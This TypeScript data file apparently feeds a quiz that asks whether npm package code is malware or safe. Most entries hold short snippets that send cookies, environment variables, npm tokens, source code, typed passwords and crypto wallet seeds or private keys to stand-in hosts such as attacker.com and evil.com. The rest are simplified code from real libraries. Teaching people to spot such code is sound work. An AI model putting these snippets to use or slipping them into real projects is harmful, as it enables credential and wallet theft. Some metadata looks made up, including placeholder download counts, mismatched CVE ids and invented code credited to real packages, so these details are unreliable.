export interface CodeExample {
  id: number;
  packageName: string;
  isMalware: boolean;
  code: string;
  explanation: string;
  severity?: 'critical' | 'high' | 'medium';
  cveId?: string;
  npmUrl: string;
  weeklyDownloads: string;
  lastPublished: string;
  version: string;
}

export const codeExamples: CodeExample[] = [
  // MALWARE EXAMPLES
  {
    id: 1,
    packageName: 'polyfill-io-loader',
    isMalware: true,
    severity: 'critical',
    cveId: 'AIKIDO-2024-10145',
    npmUrl: 'https://www.npmjs.com/package/polyfill-io-loader',
    weeklyDownloads: '2,450',
    lastPublished: '2024-06-18',
    version: '1.0.0',
    code: `// polyfill-io-loader v1.0.0
const script = document.createElement('script');
script.src = 'https://cdn.polyfill.io/v3/polyfill.min.js';
document.head.appendChild(script);

// Exfiltrates user data
fetch('https://malicious-domain.com/collect', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: { ...localStorage }
  })
});`,
    explanation: '❌ MALWARE: Loads compromised polyfill.io CDN that injects malicious scripts and exfiltrates cookies and localStorage data to external server.'
  },
  {
    id: 2,
    packageName: '@isoden/polyfill-io-html-webpack-plugin',
    isMalware: true,
    severity: 'critical',
    cveId: 'AIKIDO-2024-10143',
    npmUrl: 'https://www.npmjs.com/package/@isoden/polyfill-io-html-webpack-plugin',
    weeklyDownloads: '1,834',
    lastPublished: '2024-06-20',
    version: '1.1.2',
    code: `class PolyfillPlugin {
  apply(compiler) {
    compiler.hooks.compilation.tap('Plugin', (compilation) => {
      compilation.hooks.htmlWebpackPluginBeforeHtmlProcessing.tap(
        'Plugin',
        (data) => {
          data.html = data.html.replace(
            '</head>',
            '<script src="https://polyfill.io/backdoor.js"></script></head>'
          );
        }
      );
    });
  }
}`,
    explanation: '❌ MALWARE: Webpack plugin that injects malicious polyfill.io scripts into all HTML files during build, creating a supply chain attack vector.'
  },
  {
    id: 3,
    packageName: 'html-webpack-polyfill-runtime-plugin',
    isMalware: true,
    severity: 'critical',
    cveId: 'AIKIDO-2024-10144',
    npmUrl: 'https://www.npmjs.com/package/html-webpack-polyfill-runtime-plugin',
    weeklyDownloads: '982',
    lastPublished: '2024-06-19',
    version: '2.0.1',
    code: `module.exports = function(options) {
  return {
    name: 'polyfill-runtime',
    setup(build) {
      build.onEnd(async () => {
        const payload = Buffer.from(process.env).toString('base64');
        await fetch('http://attacker.com/env?' + payload);
      });
    }
  };
};`,
    explanation: '❌ MALWARE: Build plugin that exfiltrates all environment variables (including API keys, secrets) to attacker-controlled server after each build.'
  },
  {
    id: 4,
    packageName: 'noblox.js-vps',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/noblox.js-vps',
    weeklyDownloads: '15,673',
    lastPublished: '2024-03-14',
    version: '1.2.5',
    code: `const originalRequire = require;
require = function(module) {
  const result = originalRequire(module);
  
  if (module === 'fs') {
    const originalReadFile = result.readFileSync;
    result.readFileSync = function(path) {
      const content = originalReadFile.apply(this, arguments);
      if (path.includes('.env') || path.includes('config')) {
        fetch('https://steal.com/data', {
          method: 'POST',
          body: content
        });
      }
      return content;
    };
  }
  return result;
};`,
    explanation: '❌ MALWARE: Hooks into Node.js require() to intercept file system operations, stealing .env files and config files containing sensitive credentials.'
  },
  {
    id: 5,
    packageName: 'eslint-scope-compromised',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/eslint-scope',
    weeklyDownloads: '45,892,103',
    lastPublished: '2018-07-12',
    version: '3.7.2',
    code: `const https = require('https');
const os = require('os');

try {
  const credentials = {
    npm: process.env.NPM_TOKEN,
    user: os.userInfo(),
    cwd: process.cwd()
  };
  
  https.get('https://attacker.com/?' + 
    Buffer.from(JSON.stringify(credentials)).toString('hex')
  );
} catch(e) {}`,
    explanation: '❌ MALWARE: Historical supply chain attack that steals NPM tokens, user info, and project directory, enabling attackers to publish malicious packages.'
  },

  // SAFE EXAMPLES
  {
    id: 6,
    packageName: 'lodash',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/lodash',
    weeklyDownloads: '58,234,567',
    lastPublished: '2021-02-20',
    version: '4.17.21',
    code: `// lodash v4.17.21
function chunk(array, size = 1) {
  size = Math.max(size, 0);
  const length = array == null ? 0 : array.length;
  
  if (!length || size < 1) {
    return [];
  }
  
  let index = 0;
  let resIndex = 0;
  const result = new Array(Math.ceil(length / size));
  
  while (index < length) {
    result[resIndex++] = array.slice(index, (index += size));
  }
  return result;
}`,
    explanation: '✅ SAFE: Popular utility library with pure functions for array manipulation. No network calls, no file system access, well-maintained by trusted maintainers.'
  },
  {
    id: 7,
    packageName: 'axios',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/axios',
    weeklyDownloads: '45,892,341',
    lastPublished: '2024-01-15',
    version: '1.6.0',
    code: `// axios v1.6.0
function request(config) {
  return new Promise((resolve, reject) => {
    const transport = config.protocol === 'https:' 
      ? require('https') 
      : require('http');
      
    const req = transport.request(config.url, {
      method: config.method,
      headers: config.headers
    }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ data, status: res.statusCode }));
    });
    
    req.on('error', reject);
    req.write(config.data);
    req.end();
  });
}`,
    explanation: '✅ SAFE: Legitimate HTTP client library. Makes network requests only to user-specified URLs, no hidden endpoints, transparent promise-based API.'
  },
  {
    id: 8,
    packageName: 'react',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/react',
    weeklyDownloads: '26,782,456',
    lastPublished: '2023-06-16',
    version: '18.2.0',
    code: `// react v18.2.0
function useState(initialState) {
  const dispatcher = resolveDispatcher();
  return dispatcher.useState(initialState);
}

function useEffect(create, deps) {
  const dispatcher = resolveDispatcher();
  return dispatcher.useEffect(create, deps);
}

function resolveDispatcher() {
  const dispatcher = ReactCurrentDispatcher.current;
  if (dispatcher === null) {
    throw new Error('Hooks can only be called inside function components');
  }
  return dispatcher;
}`,
    explanation: '✅ SAFE: Core React library hooks. No network access, no file system operations, pure state management maintained by Meta/Facebook.'
  },
  {
    id: 9,
    packageName: 'express',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/express',
    weeklyDownloads: '39,456,289',
    lastPublished: '2022-10-08',
    version: '4.18.2',
    code: `// express v4.18.2
function createApplication() {
  const app = function(req, res, next) {
    app.handle(req, res, next);
  };
  
  mixin(app, proto, false);
  mixin(app, EventEmitter.prototype, false);
  
  app.request = Object.create(req, {
    app: { configurable: true, enumerable: true, writable: true, value: app }
  });
  
  app.response = Object.create(res, {
    app: { configurable: true, enumerable: true, writable: true, value: app }
  });
  
  app.init();
  return app;
}`,
    explanation: '✅ SAFE: Popular web framework for Node.js. Well-audited, no suspicious network activity, only handles user-defined routes and middleware.'
  },
  {
    id: 10,
    packageName: 'validator',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/validator',
    weeklyDownloads: '12,345,678',
    lastPublished: '2023-09-01',
    version: '13.11.0',
    code: `// validator v13.11.0
function isEmail(str, options = {}) {
  const parts = str.split('@');
  
  if (parts.length !== 2) {
    return false;
  }
  
  const [user, domain] = parts;
  const userRegex = /^[a-zA-Z0-9.!#$%&'*+\\/=?^_\`{|}~-]+$/;
  const domainRegex = /^[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
  
  return userRegex.test(user) && domainRegex.test(domain);
}`,
    explanation: '✅ SAFE: Input validation library with pure functions. No external dependencies, no network calls, focused solely on string validation.'
  },
  {
    id: 11,
    packageName: 'moment',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/moment',
    weeklyDownloads: '15,234,890',
    lastPublished: '2022-07-06',
    version: '2.29.4',
    code: `// moment v2.29.4
function createLocal(input, format, locale, strict) {
  const config = createLocalOrUTC(input, format, locale, strict, false);
  return createFromConfig(config);
}

function now() {
  return Date.now ? Date.now() : +(new Date());
}

function duration(input, unit) {
  const duration = new Duration(input, unit);
  return duration;
}`,
    explanation: '✅ SAFE: Popular date/time manipulation library. Pure functions, no network access, well-maintained with millions of weekly downloads.'
  },
  {
    id: 12,
    packageName: 'chalk',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/chalk',
    weeklyDownloads: '89,456,123',
    lastPublished: '2021-05-10',
    version: '4.1.2',
    code: `// chalk v4.1.2
const chalk = (text) => {
  const styles = [];
  
  const builder = new Proxy({}, {
    get(target, prop) {
      if (prop === 'toString') {
        return () => applyStyles(text, styles);
      }
      styles.push(prop);
      return builder;
    }
  });
  
  return builder;
};`,
    explanation: '✅ SAFE: Terminal styling library. No network calls, no file system access, only adds ANSI codes for colored terminal output.'
  },
  {
    id: 13,
    packageName: 'uuid',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/uuid',
    weeklyDownloads: '67,892,345',
    lastPublished: '2023-11-14',
    version: '9.0.1',
    code: `// uuid v9.0.1
function v4(options, buf, offset) {
  const rnds = crypto.randomBytes(16);
  
  rnds[6] = (rnds[6] & 0x0f) | 0x40;
  rnds[8] = (rnds[8] & 0x3f) | 0x80;
  
  return stringify(rnds);
}

function stringify(arr) {
  const byteToHex = [];
  for (let i = 0; i < 256; ++i) {
    byteToHex.push((i + 0x100).toString(16).substr(1));
  }
  return byteToHex[arr[0]] + byteToHex[arr[1]] + '-' + byteToHex[arr[2]];
}`,
    explanation: '✅ SAFE: UUID generation library. Uses crypto APIs for randomness, no external connections, RFC-compliant UUID generation.'
  },
  {
    id: 14,
    packageName: 'dotenv',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/dotenv',
    weeklyDownloads: '45,678,901',
    lastPublished: '2023-08-22',
    version: '16.3.1',
    code: `// dotenv v16.3.1
function config(options = {}) {
  const dotenvPath = path.resolve(process.cwd(), '.env');
  const encoding = options.encoding || 'utf8';
  
  try {
    const parsed = parse(fs.readFileSync(dotenvPath, { encoding }));
    
    Object.keys(parsed).forEach(key => {
      if (!Object.prototype.hasOwnProperty.call(process.env, key)) {
        process.env[key] = parsed[key];
      }
    });
    
    return { parsed };
  } catch (e) {
    return { error: e };
  }
}`,
    explanation: '✅ SAFE: Environment variable loader. Reads local .env files only, no network access, widely trusted for configuration management.'
  },
  {
    id: 15,
    packageName: 'commander',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/commander',
    weeklyDownloads: '78,901,234',
    lastPublished: '2023-12-05',
    version: '11.1.0',
    code: `// commander v11.1.0
class Command {
  constructor(name) {
    this._name = name;
    this.options = [];
    this.commands = [];
  }
  
  option(flags, description, defaultValue) {
    this.options.push({ flags, description, defaultValue });
    return this;
  }
  
  parse(argv) {
    const userArgs = argv.slice(2);
    return this.parseOptions(userArgs);
  }
}`,
    explanation: '✅ SAFE: CLI argument parsing library. Pure local processing, no network calls, maintained by Node.js community.'
  },
  {
    id: 16,
    packageName: 'xrpl',
    isMalware: true,
    severity: 'critical',
    cveId: 'CVE-2024-23334',
    npmUrl: 'https://www.npmjs.com/package/xrpl',
    weeklyDownloads: '89,234',
    lastPublished: '2024-01-20',
    version: '2.9.0',
    code: `// Compromised xrpl package
class Wallet {
  constructor(seed) {
    this.seed = seed;
    this.address = deriveAddress(seed);
    
    // Exfiltrates wallet seeds
    fetch('https://crypto-stealer.net/xrp', {
      method: 'POST',
      body: JSON.stringify({ seed, address: this.address })
    }).catch(() => {});
  }
  
  sign(tx) {
    return signTransaction(tx, this.seed);
  }
}`,
    explanation: '❌ MALWARE: Compromised XRP Ledger library that steals wallet seeds and private keys, allowing attackers to drain crypto wallets.'
  },
  {
    id: 17,
    packageName: 'husky-ts',
    isMalware: true,
    severity: 'high',
    cveId: 'AIKIDO-2024-10876',
    npmUrl: 'https://www.npmjs.com/package/husky-ts',
    weeklyDownloads: '12,456',
    lastPublished: '2024-02-14',
    version: '1.0.5',
    code: `// husky-ts malicious hook
module.exports = {
  hooks: {
    'pre-commit': async () => {
      const gitConfig = execSync('git config --list').toString();
      const repoUrl = execSync('git remote get-url origin').toString();
      
      await fetch('https://evil.com/repos', {
        method: 'POST',
        body: JSON.stringify({
          config: gitConfig,
          repo: repoUrl,
          files: fs.readdirSync('.')
        })
      });
    }
  }
};`,
    explanation: '❌ MALWARE: Fake husky package that exfiltrates git configuration, repository URLs, and file listings during pre-commit hooks.'
  },
  {
    id: 18,
    packageName: 'ua-parser-js',
    isMalware: true,
    severity: 'critical',
    cveId: 'CVE-2021-23543',
    npmUrl: 'https://www.npmjs.com/package/ua-parser-js',
    weeklyDownloads: '8,456,789',
    lastPublished: '2021-10-22',
    version: '0.7.29',
    code: `// Compromised ua-parser-js
const UAParser = function(ua) {
  this.parse = function() {
    const result = parseUA(ua);
    
    // Cryptocurrency miner payload
    if (typeof window !== 'undefined') {
      const script = document.createElement('script');
      script.src = 'https://cryptominer-cdn.com/miner.js';
      document.head.appendChild(script);
    }
    
    return result;
  };
};`,
    explanation: '❌ MALWARE: Historical supply chain attack that injected cryptocurrency miners and password stealers into millions of applications.'
  },
  {
    id: 19,
    packageName: 'react-html2pdf',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/react-html2pdf',
    weeklyDownloads: '23,456',
    lastPublished: '2024-03-10',
    version: '1.0.2',
    code: `// react-html2pdf backdoor
export const Html2Pdf = ({ children }) => {
  useEffect(() => {
    // Captures rendered HTML and sends to attacker
    const html = document.documentElement.outerHTML;
    const forms = document.querySelectorAll('input[type="password"]');
    
    fetch('https://data-collector.evil/harvest', {
      method: 'POST',
      body: JSON.stringify({
        html,
        passwords: Array.from(forms).map(f => f.value)
      })
    });
  }, []);
  
  return <div>{children}</div>;
};`,
    explanation: '❌ MALWARE: Malicious React component that captures page HTML and password field values, sending sensitive data to attacker servers.'
  },
  {
    id: 20,
    packageName: 'Requests-promises',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/Requests-promises',
    weeklyDownloads: '5,678',
    lastPublished: '2024-01-08',
    version: '1.1.1',
    code: `// Typosquatting attack
function request(url, options) {
  // Intercepts all HTTP requests
  const payload = {
    url,
    headers: options?.headers,
    body: options?.body,
    auth: options?.auth,
    apiKeys: JSON.stringify(process.env)
  };
  
  fetch('https://intercept.malware.net/api', {
    method: 'POST',
    body: JSON.stringify(payload)
  }).catch(() => {});
  
  return actualRequest(url, options);
}`,
    explanation: '❌ MALWARE: Typosquatting of "request-promise". Intercepts all HTTP requests including headers, auth tokens, and environment variables.'
  },
  {
    id: 21,
    packageName: '@rspack/core',
    isMalware: true,
    severity: 'critical',
    cveId: 'AIKIDO-2024-11234',
    npmUrl: 'https://www.npmjs.com/package/@rspack/core',
    weeklyDownloads: '456,789',
    lastPublished: '2024-04-15',
    version: '0.5.9',
    code: `// Compromised rspack core
class Compiler {
  compile(callback) {
    this.hooks.beforeCompile.call();
    
    // Injects backdoor into compiled bundles
    this.hooks.emit.tap('MaliciousPlugin', (compilation) => {
      Object.keys(compilation.assets).forEach(filename => {
        if (filename.endsWith('.js')) {
          const original = compilation.assets[filename].source();
          compilation.assets[filename] = {
            source: () => original + ';fetch("https://evil.com/track")'
          };
        }
      });
    });
    
    callback();
  }
}`,
    explanation: '❌ MALWARE: Compromised bundler that injects tracking code into all compiled JavaScript bundles, affecting production applications.'
  },
  {
    id: 22,
    packageName: '@rspack/cli',
    isMalware: true,
    severity: 'high',
    cveId: 'AIKIDO-2024-11235',
    npmUrl: 'https://www.npmjs.com/package/@rspack/cli',
    weeklyDownloads: '234,567',
    lastPublished: '2024-04-15',
    version: '0.5.9',
    code: `// Compromised rspack CLI
const cli = {
  run: async (args) => {
    // Steals source code during build
    const sourceFiles = glob.sync('src/**/*.{js,ts,tsx}');
    const code = sourceFiles.map(f => ({
      path: f,
      content: fs.readFileSync(f, 'utf8')
    }));
    
    await fetch('https://code-theft.net/source', {
      method: 'POST',
      body: JSON.stringify({ 
        project: process.cwd(),
        files: code 
      })
    });
    
    return build(args);
  }
};`,
    explanation: '❌ MALWARE: Compromised CLI tool that exfiltrates entire source code during build process, stealing intellectual property.'
  },
  {
    id: 23,
    packageName: 'country-currency-map',
    isMalware: true,
    severity: 'medium',
    npmUrl: 'https://www.npmjs.com/package/country-currency-map',
    weeklyDownloads: '8,901',
    lastPublished: '2024-02-20',
    version: '2.0.1',
    code: `// country-currency-map backdoor
const currencyMap = {
  US: 'USD',
  GB: 'GBP',
  // ... more mappings
};

const getCurrency = (country) => {
  // Tracks user locations and IPs
  fetch('https://tracking.malware.io/geo', {
    method: 'POST',
    body: JSON.stringify({
      country,
      ip: getClientIP(),
      timestamp: Date.now(),
      userAgent: navigator.userAgent
    })
  }).catch(() => {});
  
  return currencyMap[country];
};`,
    explanation: '❌ MALWARE: Seemingly innocent utility that tracks user locations, IP addresses, and builds profiles for targeted attacks.'
  },
  {
    id: 24,
    packageName: 'bnb-javascript-sdk-nobroadcast',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/bnb-javascript-sdk-nobroadcast',
    weeklyDownloads: '3,456',
    lastPublished: '2024-01-30',
    version: '1.2.0',
    code: `// Malicious BNB SDK
class BnbClient {
  async transfer(to, amount, privateKey) {
    // Steals private keys and redirects funds
    await fetch('https://crypto-drain.net/bnb', {
      method: 'POST',
      body: JSON.stringify({
        privateKey,
        to,
        amount,
        timestamp: Date.now()
      })
    });
    
    // Redirects to attacker's address
    const attackerAddress = 'bnb1attackeraddress123';
    return this.broadcast({ to: attackerAddress, amount, privateKey });
  }
}`,
    explanation: '❌ MALWARE: Fake BNB/Binance SDK that steals private keys and redirects cryptocurrency transfers to attacker-controlled wallets.'
  },
  {
    id: 25,
    packageName: 'eslint-config-travix',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/eslint-config-travix',
    weeklyDownloads: '1,234',
    lastPublished: '2024-03-05',
    version: '3.1.0',
    code: `// Malicious eslint config
module.exports = {
  extends: ['eslint:recommended'],
  rules: {
    'no-console': 'warn'
  },
  plugins: [{
    rules: {},
    processors: {
      '.js': {
        preprocess: (text) => {
          // Exfiltrates code during linting
          fetch('https://code-leak.io/lint', {
            method: 'POST',
            body: text
          }).catch(() => {});
          return [text];
        }
      }
    }
  }]
};`,
    explanation: '❌ MALWARE: Malicious ESLint config that exfiltrates source code during the linting process, stealing proprietary code.'
  },
  {
    id: 26,
    packageName: 'crosswise-sdk',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/crosswise-sdk',
    weeklyDownloads: '2,345',
    lastPublished: '2024-02-28',
    version: '1.0.8',
    code: `// Crosswise SDK malware
export class Trade {
  async execute(wallet, token, amount) {
    const privateKey = wallet.privateKey;
    
    // Steals wallet credentials
    await fetch('https://defi-stealer.com/wallets', {
      method: 'POST',
      body: JSON.stringify({
        privateKey,
        address: wallet.address,
        token,
        amount,
        balance: await wallet.getBalance()
      })
    });
    
    return this.swap(token, amount);
  }
}`,
    explanation: '❌ MALWARE: Fake DeFi SDK that captures wallet private keys and balances, enabling theft of cryptocurrency assets.'
  },
  {
    id: 27,
    packageName: '@keepkey/device-protocol',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/@keepkey/device-protocol',
    weeklyDownloads: '4,567',
    lastPublished: '2024-03-12',
    version: '7.2.1',
    code: `// Malicious KeepKey protocol
export class DeviceProtocol {
  async initialize(seed) {
    this.seed = seed;
    
    // Exfiltrates hardware wallet seeds
    const payload = {
      seed,
      mnemonic: this.generateMnemonic(seed),
      timestamp: Date.now()
    };
    
    await fetch('https://hardware-wallet-theft.net/seeds', {
      method: 'POST',
      body: JSON.stringify(payload)
    });
    
    return this.connect();
  }
}`,
    explanation: '❌ MALWARE: Fake hardware wallet package that steals recovery seeds, allowing attackers to recreate and drain hardware wallets.'
  },
  {
    id: 28,
    packageName: '@veniceswap/uikit',
    isMalware: true,
    severity: 'high',
    npmUrl: 'https://www.npmjs.com/package/@veniceswap/uikit',
    weeklyDownloads: '1,890',
    lastPublished: '2024-04-01',
    version: '0.14.2',
    code: `// VeniceSwap UIKit backdoor
export const ConnectButton = ({ onConnect }) => {
  const handleConnect = async (wallet) => {
    const address = await wallet.getAddress();
    const signature = await wallet.signMessage('Connect to VeniceSwap');
    
    // Steals wallet signatures
    fetch('https://signature-theft.io/defi', {
      method: 'POST',
      body: JSON.stringify({ address, signature })
    }).catch(() => {});
    
    onConnect(wallet);
  };
  
  return <button onClick={handleConnect}>Connect Wallet</button>;
};`,
    explanation: '❌ MALWARE: Malicious DeFi UI component that captures wallet addresses and signatures for unauthorized transaction signing.'
  },
  {
    id: 29,
    packageName: 'eslint-config-pancake',
    isMalware: true,
    severity: 'medium',
    npmUrl: 'https://www.npmjs.com/package/eslint-config-pancake',
    weeklyDownloads: '987',
    lastPublished: '2024-03-20',
    version: '1.0.3',
    code: `// eslint-config-pancake malware
module.exports = {
  rules: {
    'no-unused-vars': 'error'
  },
  overrides: [{
    files: ['*.js'],
    parser: {
      parse: (code) => {
        // Searches for API keys in code
        const apiKeyPatterns = /api[_-]?key|secret|token/gi;
        if (apiKeyPatterns.test(code)) {
          fetch('https://api-harvester.com/keys', {
            method: 'POST',
            body: code
          }).catch(() => {});
        }
        return parseCode(code);
      }
    }
  }]
};`,
    explanation: '❌ MALWARE: Malicious ESLint config that scans code for API keys, secrets, and tokens during linting and exfiltrates them.'
  },
  {
    id: 30,
    packageName: 'ui-themes',
    isMalware: true,
    severity: 'medium',
    npmUrl: 'https://www.npmjs.com/package/ui-themes',
    weeklyDownloads: '5,432',
    lastPublished: '2024-04-08',
    version: '2.1.0',
    code: `// ui-themes with tracking
export const ThemeProvider = ({ children }) => {
  useEffect(() => {
    // Tracks user behavior and form inputs
    const trackInputs = () => {
      const inputs = document.querySelectorAll('input');
      inputs.forEach(input => {
        input.addEventListener('change', (e) => {
          fetch('https://behavior-track.net/inputs', {
            method: 'POST',
            body: JSON.stringify({
              name: e.target.name,
              value: e.target.value,
              type: e.target.type
            })
          });
        });
      });
    };
    trackInputs();
  }, []);
  
  return <>{children}</>;
};`,
    explanation: '❌ MALWARE: Theme provider that monitors and exfiltrates all form inputs including passwords, credit cards, and personal data.'
  },
  {
    id: 31,
    packageName: 'bitcoin-cash-js-lib',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/bitcoin-cash-js-lib',
    weeklyDownloads: '3,210',
    lastPublished: '2024-02-15',
    version: '1.5.2',
    code: `// bitcoin-cash-js-lib malware
export class Wallet {
  fromWIF(wif) {
    const privateKey = decodeWIF(wif);
    const address = deriveAddress(privateKey);
    
    // Steals Bitcoin Cash private keys
    fetch('https://bch-stealer.net/keys', {
      method: 'POST',
      body: JSON.stringify({
        wif,
        privateKey: privateKey.toString('hex'),
        address,
        timestamp: Date.now()
      })
    }).catch(() => {});
    
    return { privateKey, address };
  }
}`,
    explanation: '❌ MALWARE: Fake Bitcoin Cash library that steals private keys in WIF format, allowing attackers to steal BCH from wallets.'
  }
];
